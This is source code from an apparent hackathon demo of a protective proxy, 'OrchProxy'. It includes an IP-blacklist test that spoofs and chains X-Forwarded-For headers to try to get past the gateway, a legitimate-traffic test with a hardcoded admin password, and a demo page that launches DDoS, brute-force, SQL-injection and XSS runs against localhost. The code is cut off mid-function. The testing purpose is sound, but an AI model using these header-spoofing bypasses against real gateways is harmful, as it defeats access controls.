      { ip: '1.2.3.4',      label: 'Chain: clean,blacklisted (last wins?)',   headerKey: 'X-Forwarded-For', chainWith: '203.0.113.42'  },
      { ip: '127.0.0.1',    label: 'Chain: loopback,attacker',               headerKey: 'X-Forwarded-For', chainWith: '203.0.113.42'  },
    ],

  };

  // Endpoints to probe per IP (if testMultipleEndpoints enabled)
  const ENDPOINTS = CONFIG.testMultipleEndpoints
    ? ['/getAllUsers', '/admin/stats', '/api/data', '/login']
    : ['/getAllUsers'];

  // --- Helpers ---
  const jitter = () => new Promise(res =>
    setTimeout(res, CONFIG.delay.min + Math.random() * (CONFIG.delay.max - CONFIG.delay.min))
  );

  const chunk = (arr, size) =>
    Array.from({ length: Math.ceil(arr.length / size) }, (_, i) =>
      arr.slice(i * size, i * size + size)
    );

  // Expected outcome per category
  const shouldBeBlocked = category =>
    ['knownAttackers', 'torAndProxy', 'cidrBlock', 'spoofingAttempts', 'chaining'].includes(category);

  // Risk classifier
  const classify = (status, category, label) => {
    const expectBlock = shouldBeBlocked(category);

    if (status === 403 || status === 429) {
      return expectBlock
        ? { icon: '⛔', verdict: 'BLOCKED — correct behaviour',       risk: 'safe',    critical: false }
        : { icon: '⚠️', verdict: 'FALSE POSITIVE — clean IP blocked', risk: 'medium',  critical: false };
    }
    if (status === 200 || status === 204) {
      return expectBlock
        ? { icon: '🚨', verdict: 'BYPASS — blacklisted IP passed!',   risk: 'critical', critical: true  }
        : { icon: '✅', verdict: 'ALLOWED — correct behaviour',        risk: 'safe',    critical: false };
    }
    if (status === 401 || status === 404) {
      return expectBlock
        ? { icon: '⚠️', verdict: 'Auth/404 — not explicitly blocked', risk: 'medium',  critical: false }
        : { icon: '✅', verdict: 'Correct — reached app layer',        risk: 'safe',    critical: false };
    }
    return { icon: '❓', verdict: `Unexpected: ${status}`, risk: 'unknown', critical: false };
  };

  // Build full attempt list
  const ALL_ATTEMPTS = Object.entries(IP_LIST).flatMap(([category, items]) =>
    items.flatMap(({ ip, label, headerKey, chainWith }) =>
      ENDPOINTS.map(endpoint => ({
        category,
        ip,
        label,
        endpoint,
        headerKey: headerKey || 'X-Forwarded-For',
        chainWith: chainWith || null,
      }))
    )
  );

  const results = [];
  let attemptNum = 0;
  let criticalFound = false;

  // --- Main loop ---
  for (const batch of chunk(ALL_ATTEMPTS, CONFIG.concurrency)) {
    await Promise.allSettled(
      batch.map(async ({ category, ip, label, endpoint, headerKey, chainWith }) => {
        attemptNum++;
        await jitter();

        // Build spoofed IP header value (support chaining)
        const ipHeaderValue = chainWith ? `${ip}, ${chainWith}` : ip;

        let r;
        try {
          r = await makeReq({
            path: endpoint,
            spoofIP: ip,
            headers: {
              [headerKey]:        ipHeaderValue,
              'X-Forwarded-For':  ipHeaderValue,      // Always set both for realism
              'User-Agent':       'Mozilla/5.0 (compatible; SecurityScanner/1.0)',
              'Accept':           'application/json',
            },
          });
        } catch (err) {
          add('✗', `[${category}] #${attemptNum} — ${label} → ${endpoint}`, 0,
            `Network error: ${err.message}`, false);
          return;
        }

        const { icon, verdict, risk, critical } = classify(r.status, category, label);
        if (critical) criticalFound = true;

        const entry = {
          num: attemptNum, category, ip, label, endpoint,
          headerKey, chainWith, status: r.status,
          verdict, risk, critical, ts: Date.now(),
        };

        results.push(entry);

        add(
          icon,
          `[${category.toUpperCase()}] #${attemptNum} — ${label} → ${endpoint}`,
          r.status,
          verdict,
          !critical && risk === 'safe'
        );
      })
    );
  }

  // --- Summary ---
  const byRisk      = level  => results.filter(r => r.risk === level).length;
  const bypasses    = results.filter(r => r.critical);
  const falsePos    = results.filter(r => r.risk === 'medium' && !shouldBeBlocked(r.category) && (r.status === 403 || r.status === 429));

  const byCategory  = [...new Set(results.map(r => r.category))].map(cat => ({
    category:      cat,
    total:         results.filter(r => r.category === cat).length,
    correct:       results.filter(r => r.category === cat && r.risk === 'safe').length,
    bypassed:      results.filter(r => r.category === cat && r.critical).length,
    falsePositive: results.filter(r => r.category === cat && r.risk === 'medium').length,
  }));

  console.table({
    'Total Checks':         results.length,
    'Correctly Blocked':    byRisk('safe') - results.filter(r => r.risk === 'safe' && !shouldBeBlocked(r.category)).length,
    'Correctly Allowed':    results.filter(r => r.risk === 'safe' && !shouldBeBlocked(r.category)).length,
    'False Positives':      falsePos.length,
    'BYPASSES (critical)':  byRisk('critical'),
    'Medium Risk':          byRisk('medium'),
    'Unknown':              byRisk('unknown'),
  });

  console.table(byCategory);

  if (bypasses.length > 0) {
    console.warn(`🚨 CRITICAL: ${bypasses.length} blacklisted IP(s) bypassed the gateway:`);
    bypasses.forEach(b =>
      console.warn(`  → ${b.ip} via ${b.headerKey} on ${b.endpoint} [${b.label}]`)
    );
  }

  if (falsePos.length > 0) {
    console.warn(`⚠️ FALSE POSITIVES: ${falsePos.length} clean IP(s) were incorrectly blocked.`);
  }

  log.sort((a, b) => a.ts - b.ts);
}
//-----old version of legit traffic test
 /* else if (type === 'legit') {
    let r = await makeReq({ path: '/health' });
    add('💚', 'Health check', r.status, r.body.status || 'ok', false);

    r = await makeReq({ path: '/getAllUsers' });
    add('✓', `GET /getAllUsers`, r.status, `${(r.body.users||[]).length} users returned`, false);

    r = await makeReq({ method: 'POST', path: '/login', body: { username: 'admin', password: 'secret123' } });
    add('✓', 'POST /login (correct credentials)', r.status, r.status === 200 ? 'Token received — logged in!' : 'Failed', false);

    r = await makeReq({ path: '/stats' });
    add('✓', 'GET /stats', r.status, `${r.body.activeSessions || 1} active session`, false);
  }

  return log;
}*/

//-------new version of legit traffic test

else if (type === 'legit') {

  // --- Config ---
  const CONFIG = {
    delay:          { min: 30, max: 150 },  // Realistic human/client jitter
    concurrency:    3,                       // Parallel where safe; sequential where order matters
    retryOnFail:    2,                       // Retry transient failures (503, 502, timeout)
    retryDelay:     500,                     // ms between retries
    authToken:      null,                    // Populated after /login succeeds
    sessionId:      `sess_${Date.now()}`,    // Simulate persistent session
  };

  // --- Helpers ---
  const jitter = () => new Promise(res =>
    setTimeout(res, CONFIG.delay.min + Math.random() * (CONFIG.delay.max - CONFIG.delay.min))
  );

  // Retry wrapper for transient failures
  const withRetry = async (fn, label, retries = CONFIG.retryOnFail) => {
    for (let attempt = 1; attempt <= retries + 1; attempt++) {
      try {
        const result = await fn();
        if (![502, 503, 504].includes(result?.status) || attempt > retries) return result;
        await new Promise(res => setTimeout(res, CONFIG.retryDelay * attempt));
      } catch (err) {
        if (attempt > retries) throw err;
        await new Promise(res => setTimeout(res, CONFIG.retryDelay * attempt));
      }
    }
  };

  // Classify response quality
  const classify = (status, expected = [200]) => {
    if (expected.includes(status))          return { icon: '✅', risk: 'ok',      label: 'OK'            };
    if (status === 401 || status === 403)   return { icon: '🔐', risk: 'auth',    label: 'Auth failure'  };
    if (status === 404)                     return { icon: '🔍', risk: 'missing', label: 'Not found'     };
    if (status === 429)                     return { icon: '⚡', risk: 'ratelimit',label: 'Rate limited'  };
    if (status >= 500)                      return { icon: '💥', risk: 'error',   label: 'Server error'  };
    return                                         { icon: '❓', risk: 'unknown', label: `Unexpected ${status}` };
  };

  // Auth-aware request builder
  const req = (opts) => makeReq({
    ...opts,
    headers: {
      'User-Agent':    'MyApp/2.1 (production-client)',
      'X-Session-ID':  CONFIG.sessionId,
      'X-Request-ID':  `req_${Math.random().toString(36).slice(2, 10)}`,
      ...(CONFIG.authToken ? { 'Authorization': `Bearer ${CONFIG.authToken}` } : {}),
      ...opts.headers,
    },
  });

  const results = [];
  let stepNum = 0;

  const run = async ({ label, fn, expected = [200], critical = false }) => {
    stepNum++;
    await jitter();
    const t0 = Date.now();
    let r;

    try {
      r = await withRetry(fn, label);
    } catch (err) {
      add('✗', `#${stepNum} ${label}`, 0, `Network error: ${err.message}`, false);
      results.push({ stepNum, label, status: 0, responseTime: Date.now() - t0, risk: 'error', critical });
      return null;
    }

    const responseTime = Date.now() - t0;
    const { icon, risk, label: riskLabel } = classify(r.status, expected);
    const note = r.body
      ? typeof r.body === 'object'
        ? Object.entries(r.body).slice(0, 3).map(([k, v]) =>
            `${k}: ${Array.isArray(v) ? v.length + ' items' : v}`
          ).join(' | ')
        : String(r.body).slice(0, 80)
      : riskLabel;

    add(icon, `#${stepNum} ${label}`, `${r.status} (${responseTime}ms)`, note, false);
    results.push({ stepNum, label, status: r.status, responseTime, risk, critical });
    return r;
  };

  // ─────────────────────────────────────────────
  // PHASE 1 — Infrastructure checks (parallel)
  // ─────────────────────────────────────────────
  await Promise.allSettled([
    run({
      label:    'Health check — /health',
      expected: [200],
      fn: () => req({ path: '/health' }),
    }),
    run({
      label:    'Readiness probe — /ready',
      expected: [200, 204],
      fn: () => req({ path: '/ready' }),
    }),
    run({
      label:    'Liveness probe — /live',
      expected: [200, 204],
      fn: () => req({ path: '/live' }),
    }),
    run({
      label:    'Version/build info — /version',
      expected: [200],
      fn: () => req({ path: '/version' }),
    }),
  ]);

  // ─────────────────────────────────────────────
  // PHASE 2 — Authentication flow (sequential — order matters)
  // ─────────────────────────────────────────────
  await jitter();

  // Step 1: Wrong credentials (should 401)
  await run({
    label:    'POST /login — wrong password (expect 401)',
    expected: [401],
    fn: () => req({ method: 'POST', path: '/login', body: { username: 'admin', password: 'wrongpassword' } }),
  });

  await jitter();

  // Step 2: Correct credentials — capture token
  const loginRes = await run({
    label:    'POST /login — correct credentials',
    expected: [200],
    critical: true,
    fn: () => req({ method: 'POST', path: '/login', body: { username: 'admin', password: 'secret123' } }),
  });

  if (loginRes?.body?.token) {
    CONFIG.authToken = loginRes.body.token;
    add('🔑', 'Auth token captured', '—', `Token: ${CONFIG.authToken.slice(0, 16)}…`, false);
  }

  await jitter();

  // Step 3: Token refresh (if endpoint exists)
  await run({
    label:    'POST /auth/refresh — token refresh',
    expected: [200, 204, 404],   // 404 acceptable — endpoint may not exist
    fn: () => req({ method: 'POST', path: '/auth/refresh', body: { token: CONFIG.authToken } }),
  });

  // ─────────────────────────────────────────────
  // PHASE 3 — Authenticated reads (parallel)
  // ─────────────────────────────────────────────
  await Promise.allSettled([
    run({
      label:    'GET /getAllUsers — full user list',
      expected: [200],
      fn: () => req({ path: '/getAllUsers' }),
    }),
    run({
      label:    'GET /stats — system statistics',
      expected: [200],
      fn: () => req({ path: '/stats' }),
    }),
    run({
      label:    'GET /admin/dashboard — admin panel',
      expected: [200, 403],    // 403 expected if RBAC enforced
      fn: () => req({ path: '/admin/dashboard' }),
    }),
    run({
      label:    'GET /api/config — gateway config',
      expected: [200, 403],
      fn: () => req({ path: '/api/config' }),
    }),
    run({
      label:    'GET /metrics — Prometheus metrics',
      expected: [200, 403, 404],
      fn: () => req({ path: '/metrics' }),
    }),
  ]);

  // ─────────────────────────────────────────────
  // PHASE 4 — Write operations (sequential)
  // ─────────────────────────────────────────────
  await jitter();

  const newUser = {
    username: `testuser_${Date.now()}`,
    email:    `test_${Date.now()}@example.com`,
    role:     'viewer',
  };

  const createRes = await run({
    label:    'POST /users — create test user',
    expected: [200, 201],
    fn: () => req({ method: 'POST', path: '/users', body: newUser }),
  });

  const createdId = createRes?.body?.id || createRes?.body?.userId || null;

  if (createdId) {
    await jitter();

    await run({
      label:    `GET /users/${createdId} — fetch created user`,
      expected: [200],
      fn: () => req({ path: `/users/${createdId}` }),
    });

    await jitter();

    await run({
      label:    `PATCH /users/${createdId} — update user`,
      expected: [200, 204],
      fn: () => req({ method: 'PATCH', path: `/users/${createdId}`, body: { role: 'editor' } }),
    });

    await jitter();

    await run({
      label:    `DELETE /users/${createdId} — cleanup test user`,
      expected: [200, 204],
      fn: () => req({ method: 'DELETE', path: `/users/${createdId}` }),
    });
  }

  // ─────────────────────────────────────────────
  // PHASE 5 — Edge cases & gateway behaviour
  // ─────────────────────────────────────────────
  await Promise.allSettled([
    run({
      label:    'GET /nonexistent — 404 handling',
      expected: [404],
      fn: () => req({ path: '/nonexistent-route-xyz' }),
    }),
    run({
      label:    'GET /getAllUsers — no auth token (expect 401)',
      expected: [401, 403],
      fn: () => makeReq({ path: '/getAllUsers' }),   // raw — no auth header
    }),
    run({
      label:    'OPTIONS /getAllUsers — CORS preflight',
      expected: [200, 204],
      fn: () => req({ method: 'OPTIONS', path: '/getAllUsers',
        headers: { 'Origin': 'https://myfrontend.com', 'Access-Control-Request-Method': 'GET' } }),
    }),
    run({
      label:    'HEAD /health — HEAD method support',
      expected: [200],
      fn: () => req({ method: 'HEAD', path: '/health' }),
    }),
    run({
      label:    'GET /getAllUsers — large Accept header',
      expected: [200, 400],
      fn: () => req({ path: '/getAllUsers',
        headers: { 'Accept': 'application/json, text/html, application/xml, */*; q=0.8' } }),
    }),
  ]);

  // ─────────────────────────────────────────────
  // PHASE 6 — Logout
  // ─────────────────────────────────────────────
  await jitter();

  await run({
    label:    'POST /logout — session teardown',
    expected: [200, 204],
    fn: () => req({ method: 'POST', path: '/logout', body: { token: CONFIG.authToken } }),
  });

  // Verify token is invalidated after logout
  await jitter();

  await run({
    label:    'GET /getAllUsers — post-logout (expect 401)',
    expected: [401, 403],
    fn: () => req({ path: '/getAllUsers' }),
  });

  // ─────────────────────────────────────────────
  // Summary
  // ─────────────────────────────────────────────
  const byRisk    = level => results.filter(r => r.risk === level).length;
  const avgTime   = Math.round(results.reduce((s, r) => s + r.responseTime, 0) / results.length);
  const slowest   = results.reduce((a, b) => a.responseTime > b.responseTime ? a : b);
  const critFails = results.filter(r => r.critical && r.risk !== 'ok');

  console.table({
    'Total Steps':          results.length,
    'All OK':               byRisk('ok'),
    'Auth Issues':          byRisk('auth'),
    'Rate Limited':         byRisk('ratelimit'),
    'Server Errors':        byRisk('error'),
    'Not Found':            byRisk('missing'),
    'Avg Response (ms)':    avgTime,
    'Slowest Step':         `${slowest.label} (${slowest.responseTime}ms)`,
    'Critical Failures':    critFails.length,
  });

  if (critFails.length > 0) {
    console.warn('🚨 Critical steps failed:');
    critFails.forEach(f => console.warn(`  → #${f.stepNum} ${f.label} — status ${f.status}`));
  }

}

return log;}

// ── HTML ──────────────────────────────────────────────────────────────────────

function demoHTML() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>OrchProxy — Live Hackathon Demo</title>
<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@600;800&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
<style>
  :root {
    --bg:#06080c; --surface:#0c0f15; --border:#1a2030; --border2:#253040;
    --accent:#00e5ff; --green:#00ff88; --red:#ff3355; --yellow:#ffcc00; --purple:#c084fc;
    --text:#d0dce8; --muted:#4a6070;
    --mono:'Space Mono',monospace; --display:'Syne',sans-serif; --sans:'DM Sans',sans-serif;
  }
  * { box-sizing:border-box; margin:0; padding:0; }
  html,body { height:100%; background:var(--bg); color:var(--text); font-family:var(--sans); overflow:hidden; }

  /* Scanlines */
  body::after { content:''; position:fixed; inset:0; pointer-events:none; z-index:999;
    background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,229,255,.012) 3px,rgba(0,229,255,.012) 4px); }

  /* ── Header ── */
  header {
    height:54px; display:flex; align-items:center; padding:0 24px; gap:16px;
    background:var(--surface); border-bottom:1px solid var(--border);
    position:relative; z-index:10;
  }
  .logo { font-family:var(--display); font-size:18px; font-weight:800; color:var(--accent); letter-spacing:1px; }
  .tagline { font-size:12px; color:var(--muted); font-family:var(--mono); }
  .hdr-right { margin-left:auto; display:flex; align-items:center; gap:12px; }
  .live-dot { width:8px; height:8px; background:var(--green); border-radius:50%; animation:blink 1.2s ease-in-out infinite; }
  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:.3} }
  .hdr-badge { font-family:var(--mono); font-size:11px; color:var(--muted); }
  .mode-badge {
    padding:4px 12px; border-radius:4px; font-family:var(--mono); font-size:11px; font-weight:700; letter-spacing:1px;
    transition:all .4s;
  }
  .mode-unprotected { background:rgba(255,51,85,.12); color:var(--red); border:1px solid rgba(255,51,85,.3); }
  .mode-protected   { background:rgba(0,255,136,.1); color:var(--green); border:1px solid rgba(0,255,136,.3); }

  /* ── 3-panel layout ── */
  .panels { display:grid; grid-template-columns:1fr 340px 1fr; height:calc(100vh - 54px - 64px); gap:1px; background:var(--border); }
  .panel { background:var(--bg); display:flex; flex-direction:column; overflow:hidden; }

  .panel-header {
    padding:12px 18px; background:var(--surface); border-bottom:1px solid var(--border);
    display:flex; align-items:center; gap:10px; flex-shrink:0;
  }
  .panel-title { font-family:var(--mono); font-size:12px; letter-spacing:1px; text-transform:uppercase; }
  .panel-title.blue   { color:var(--accent); }
  .panel-title.red    { color:var(--red); }
  .panel-title.green  { color:var(--green); }
  .panel-status { margin-left:auto; font-family:var(--mono); font-size:10px; }

  /* ── Website iframe panel ── */
  .site-panel { position:relative; }
  .site-frame { flex:1; border:none; width:100%; display:block; }
  .attack-overlay {
    position:absolute; inset:0; pointer-events:none;
    opacity:0; transition:opacity .3s;
    background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(255,0,50,.04) 2px,rgba(255,0,50,.04) 4px);
    z-index:5;
  }
  .attack-overlay.active { opacity:1; animation:glitch 0.15s infinite; }
  @keyframes glitch {
    0%   { transform:translate(0,0); filter:hue-rotate(0deg); }
    25%  { transform:translate(-2px,1px); filter:hue-rotate(90deg); }
    50%  { transform:translate(2px,-1px); filter:hue-rotate(-90deg); }
    75%  { transform:translate(-1px,2px); filter:hue-rotate(45deg); }
    100% { transform:translate(0,0); filter:hue-rotate(0deg); }
  }
  .attack-text {
    position:absolute; top:50%; left:50%; transform:translate(-50%,-50%);
    font-family:var(--mono); font-size:14px; color:var(--red); font-weight:700;
    text-align:center; z-index:6; opacity:0; transition:opacity .3s;
    text-shadow:0 0 20px var(--red); pointer-events:none;
    background:rgba(6,8,12,.85); padding:16px 28px; border-radius:8px; border:1px solid var(--red);
    white-space:nowrap;
  }
  .attack-text.visible { opacity:1; }

  /* ── Center attack console ── */
  .console-panel { border-left:1px solid var(--border); border-right:1px solid var(--border); }
  .attack-btns { padding:12px; display:grid; grid-template-columns:1fr 1fr; gap:8px; flex-shrink:0; }
  .atk-btn {
    padding:10px 6px; border-radius:6px; font-family:var(--mono); font-size:10px; font-weight:700;
    letter-spacing:.5px; cursor:pointer; border:1px solid; transition:all .15s; text-transform:uppercase;
    display:flex; flex-direction:column; align-items:center; gap:4px;
  }
  .atk-btn .icon { font-size:16px; }
  .atk-btn:active { transform:scale(.97); }
  .atk-btn.ddos       { background:rgba(255,51,85,.08); color:var(--red); border-color:rgba(255,51,85,.3); }
  .atk-btn.brute      { background:rgba(255,204,0,.08); color:var(--yellow); border-color:rgba(255,204,0,.3); }
  .atk-btn.sql        { background:rgba(192,132,252,.08); color:var(--purple); border-color:rgba(192,132,252,.3); }
  .atk-btn.xss        { background:rgba(255,120,60,.08); color:#ff7840; border-color:rgba(255,120,60,.3); }
  .atk-btn.blacklist  { background:rgba(255,51,85,.12); color:var(--red); border-color:rgba(255,51,85,.4); }
  .atk-btn.legit      { background:rgba(0,255,136,.08); color:var(--green); border-color:rgba(0,255,136,.3); }
  .atk-btn:hover      { filter:brightness(1.3); }
  .atk-btn.running    { opacity:.5; pointer-events:none; }

  .console-log { flex:1; overflow-y:auto; padding:10px; font-family:var(--mono); font-size:11px; }
  .log-entry {
    display:grid; grid-template-columns:20px 1fr auto; gap:8px; align-items:start;
    padding:7px 8px; border-radius:5px; margin-bottom:4px; border:1px solid transparent;
    animation:fadeIn .25s ease;
  }
  @keyframes fadeIn { from{opacity:0;transform:translateY(4px)} to{opacity:1;transform:none} }
  .log-entry.blocked  { background:rgba(255,51,85,.06); border-color:rgba(255,51,85,.15); }
  .log-entry.passed   { background:rgba(0,229,255,.04); border-color:rgba(0,229,255,.1); }
  .log-emoji { font-size:13px; line-height:1.5; }
  .log-info { }
  .log-label { font-size:11px; color:var(--text); margin-bottom:3px; word-break:break-all; }
  .log-note  { font-size:10px; }
  .log-note.blocked { color:var(--red); }
  .log-note.passed  { color:var(--accent); }
  .log-note.success { color:var(--green); }
  .log-status { font-size:11px; font-weight:700; align-self:center; padding:1px 6px; border-radius:3px; }
  .s200 { color:var(--green); } .s401 { color:var(--yellow); } .s400,.s403,.s429 { color:var(--red); }

  .console-stats { display:grid; grid-template-columns:1fr 1fr 1fr; gap:1px; background:var(--border); flex-shrink:0; }
  .cs { background:var(--surface); padding:10px; text-align:center; }
  .cs-val { font-family:var(--mono); font-size:18px; font-weight:700; }
  .cs-label { font-size:10px; color:var(--muted); margin-top:2px; }

  /* ── Dashboard iframe ── */
  .dash-frame { flex:1; border:none; width:100%; display:block; }

  /* ── Bottom control bar ── */
  .control-bar {
    height:64px; background:var(--surface); border-top:1px solid var(--border);
    display:flex; align-items:center; justify-content:center; gap:24px; padding:0 32px;
  }
  .ctrl-btn {
    padding:10px 28px; border-radius:8px; font-family:var(--mono); font-size:12px; font-weight:700;
    letter-spacing:1px; cursor:pointer; border:1px solid; transition:all .2s; text-transform:uppercase;
  }
  .ctrl-btn.protect { background:rgba(0,255,136,.12); color:var(--green); border-color:rgba(0,255,136,.4); }
  .ctrl-btn.protect:hover { background:rgba(0,255,136,.2); }
  .ctrl-btn.unprotect { background:rgba(255,51,85,.1); color:var(--red); border-color:rgba(255,51,85,.3); }
  .ctrl-btn.unprotect:hover { background:rgba(255,51,85,.2); }
  .ctrl-btn.reset { background:transparent; color:var(--muted); border-color:var(--border2); }
  .ctrl-btn.reset:hover { color:var(--text); border-color:var(--border2); }
  .ctrl-divider { width:1px; height:32px; background:var(--border); }
  .ctrl-info { font-family:var(--mono); font-size:11px; color:var(--muted); text-align:center; line-height:1.6; }

  ::-webkit-scrollbar { width:4px; } 
  ::-webkit-scrollbar-track { background:transparent; }
  ::-webkit-scrollbar-thumb { background:var(--border2); border-radius:2px; }
</style>
</head>
<body>

<header>
  <div class="logo">ORCHPROXY</div>
  <div class="tagline">// live attack demo — hackathon presentation</div>
  <div class="hdr-right">
    <div class="live-dot"></div>
    <span class="hdr-badge">DEMO RUNNING</span>
    <div class="mode-badge mode-unprotected" id="mode-badge">⚠ UNPROTECTED</div>
  </div>
</header>

<div class="panels">

  <!-- LEFT: Target Website -->
  <div class="panel site-panel" id="site-panel">
    <div class="panel-header">
      <div class="panel-title blue">① Target Website</div>
      <div class="panel-status" id="site-url" style="color:var(--red)">http://localhost:8080 — NO PROXY</div>
    </div>
    <div class="attack-overlay" id="atk-overlay"></div>
    <div class="attack-text" id="atk-text">UNDER ATTACK</div>
    <iframe class="site-frame" id="site-frame" src="http://localhost:8080"></iframe>
  </div>

  <!-- CENTER: Attack Console -->
  <div class="panel console-panel">
    <div class="panel-header">
      <div class="panel-title red">② Attack Console</div>
      <div class="panel-status" id="atk-status" style="color:var(--muted)">ready</div>
    </div>

    <div class="attack-btns">
      <button class="atk-btn ddos"      onclick="attack('ddos')">      <span class="icon">💥</span>DDoS Flood</button>
      <button class="atk-btn brute"     onclick="attack('bruteforce')"> <span class="icon">🔓</span>Brute Force</button>
      <button class="atk-btn sql"       onclick="attack('sqlinject')">  <span class="icon">💉</span>SQL Inject</button>
      <button class="atk-btn xss"       onclick="attack('xss')">        <span class="icon">🕸</span>XSS Attack</button>
      <button class="atk-btn blacklist" onclick="attack('blacklist')">  <span class="icon">🚫</span>Blacklist</button>
      <button class="atk-btn legit"     onclick="attack('legit')">      <span class="icon">✅</span>Legit User</button>
    </div>

    <div class="console-stats">
      <div class="cs"><div class="cs-val" id="cs-total" style="color:var(--accent)">0</div><div class="cs-label">SENT</div></div>
      <div class="cs"><div class="cs-val" id="cs-blocked" style="color:var(--red)">0</div><div class="cs-label">BLOCKED</div></div>
      <div class="cs"><div class="cs-val" id="cs-passed" style="color:var(--green)">0</div><div class="cs-label">PASSED</div></div>
    </div>

    <div class="console-log" id="console-log">
      <div style="color:var(--muted);font-size:11px;text-align:center;padding:32px 0">
        Select an attack above to begin the demo.<br><br>
        <span style="color:var(--accent)">① Without proxy</span> — attacks reach the backend<br>
        <span style="color:var(--green)">② Enable proxy</span> — attacks are blocked
      </div>
    </div>
  </div>

  <!-- RIGHT: Proxy Dashboard -->
  <div class="panel" id="dash-panel">
    <div class="panel-header">
      <div class="panel-title green">③ Proxy Shield Dashboard</div>
      <div class="panel-status" id="dash-status" style="color:var(--muted)">http://localhost:9091</div>
    </div>
    <iframe class="dash-frame" id="dash-frame" src="http://localhost:9091"></iframe>
  </div>

</div>

<!-- Control Bar -->
<div class="control-bar">
  <div class="ctrl-info">Site target:<br><span id="ctrl-target" style="color:var(--red)">localhost:8080 (direct)</span></div>
  <div class="ctrl-divider"></div>
  <button class="ctrl-btn unprotect" onclick="setDirect()">⚠ Remove Proxy</button>
  <button class="ctrl-btn protect"   onclick="setProxy()">🛡 Enable Proxy</button>
  <div class="ctrl-divider"></div>
  <button class="ctrl-btn reset" onclick="resetLog()">↺ Clear Log</button>
  <div class="ctrl-divider"></div>
  <div class="ctrl-info" style="color:var(--muted)">
    Proxy: <span style="color:var(--accent)">:9090</span> &nbsp;|&nbsp;
    Backend: <span style="color:var(--accent)">:8080</span> &nbsp;|&nbsp;
    Dashboard: <span style="color:var(--accent)">:9091</span>
  </div>
</div>

<script>
let totals = { sent: 0, blocked: 0, passed: 0 };
let useProxy = false;
let running = false;

function setProxy() {
  useProxy = true;
  document.getElementById('site-frame').src = 'http://localhost:9090';
  document.getElementById('site-url').textContent   = 'http://localhost:9090 — PROXY ACTIVE';
  document.getElementById('site-url').style.color   = 'var(--green)';
  document.getElementById('mode-badge').textContent = '🛡 PROTECTED';
  document.getElementById('mode-badge').className   = 'mode-badge mode-protected';
  document.getElementById('ctrl-target').textContent = 'localhost:9090 (via proxy)';
  document.getElementById('ctrl-target').style.color = 'var(--green)';
  addSysLog('🛡 Proxy ENABLED — all attacks now routed through OrchProxy', 'success');
}

function setDirect() {
  useProxy = false;
  document.getElementById('site-frame').src = 'http://localhost:8080';
  document.getElementById('site-url').textContent   = 'http://localhost:8080 — NO PROXY';
  document.getElementById('site-url').style.color   = 'var(--red)';
  document.getElementById('mode-badge').textContent = '⚠ UNPROTECTED';
  document.getElementById('mode-badge').className   = 'mode-badge mode-unprotected';
  document.getElementById('ctrl-target').textContent = 'localhost:8080 (direct)';
  document.getElementById('ctrl-target').style.color = 'var(--red)';
  addSysLog('⚠ Proxy DISABLED — site is exposed', 'danger');
}

function resetLog() {
  totals = { sent: 0, blocked: 0, passed: 0 };
  updateCounters();
  document.getElementById('console-log').innerHTML =
    '<div style="color:var(--muted);font-size:11px;text-align:center;padding:24px">Log cleared. Ready.</div>';
}

function updateCounters() {
  document.getElementById('cs-total').textContent   = totals.sent;
  document.getElementById('cs-blocked').textContent = totals.blocked;
  document.getElementById('cs-passed').textContent  = totals.passed;
}

function addSysLog(msg, type) {
  const log = document.getElementById('console-log');
  const div = document.createElement('div');
  div.style.cssText = 'padding:8px;font-size:11px;font-family:var(--mono);border-radius:4px;margin-bottom:4px;animation:fadeIn .25s ease;';
  if (type === 'success') { div.style.color = 'var(--green)'; div.style.background = 'rgba(0,255,136,.06)'; }
  else if (type === 'danger') { div.style.color = 'var(--red)'; div.style.background = 'rgba(255,51,85,.06)'; }
  else { div.style.color = 'var(--accent)'; div.style.background = 'rgba(0,229,255,.04)'; }
  div.textContent = msg;
  log.insertBefore(div, log.firstChild);
}

function showGlitch(on, label = '') {
  const overlay = document.getElementById('atk-overlay');
  const text    = document.getElementById('atk-text');
  overlay.classList.toggle('active', on);
  if (on) {
    text.textContent = '⚠ ' + label;
    text.classList.add('visible');
  } else {
    text.classList.remove('visible');
  }
}

async function attack(type) {
  if (running) return;
  running = true;

  const labels = { ddos:'DDoS Flood', bruteforce:'Brute Force Login', sqlinject:'SQL Injection', xss:'XSS Attack', blacklist:'IP Blacklist', legit:'Legit Traffic' };
  const isHostile = type !== 'legit';

  document.querySelectorAll('.atk-btn').forEach(b => b.classList.add('running'));
  document.getElementById('atk-status').textContent = 'running ' + labels[type] + '…';

  if (isHostile) showGlitch(true, labels[type].toUpperCase() + ' IN PROGRESS');
  addSysLog('▶ Starting: ' + labels[type] + (useProxy ? ' [PROXY ON]' : ' [NO PROXY]'), 'info');

  try {
    const r = await fetch('/run-attack', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, useProxy })
    });
    const results = await r.json();

    if (isHostile) showGlitch(false);

    const log = document.getElementById('console-log');
    // Clear placeholder
    if (log.querySelector('[data-placeholder]')) log.innerHTML = '';

    let attackBlocked = 0, attackPassed = 0;

    results.forEach(entry => {
      totals.sent++;
      const blocked = entry.blocked;
      if (blocked) { totals.blocked++; attackBlocked++; }
      else { totals.passed++; attackPassed++; }

      const div = document.createElement('div');
      div.className = 'log-entry ' + (blocked ? 'blocked' : 'passed');

      const noteClass = blocked ? 'blocked' : entry.status === 200 ? 'success' : 'passed';
      const sClass    = 's' + Math.min(entry.status, 429);

      div.innerHTML = \`
        <span class="log-emoji">\${entry.emoji}</span>
        <div class="log-info">
          <div class="log-label">\${entry.label}</div>
          <div class="log-note \${noteClass}">\${entry.note}</div>
        </div>
        <span class="log-status \${sClass}">\${entry.status}</span>\`;

      log.insertBefore(div, log.firstChild);
    });

    updateCounters();

    const summary = isHostile
      ? (useProxy
          ? \`✅ PROXY BLOCKED \${attackBlocked}/\${results.length} attacks!\`
          : \`⚠ \${attackPassed} attacks REACHED the backend (no proxy)\`)
      : \`✓ \${attackPassed} legit requests served successfully\`;

    addSysLog(summary, useProxy && isHostile ? 'success' : isHostile ? 'danger' : 'success');
    document.getElementById('atk-status').textContent = \`done — \${results.length} requests\`;

  } catch(e) {
    showGlitch(false);
    addSysLog('Error running attack: ' + e.message, 'danger');
  }

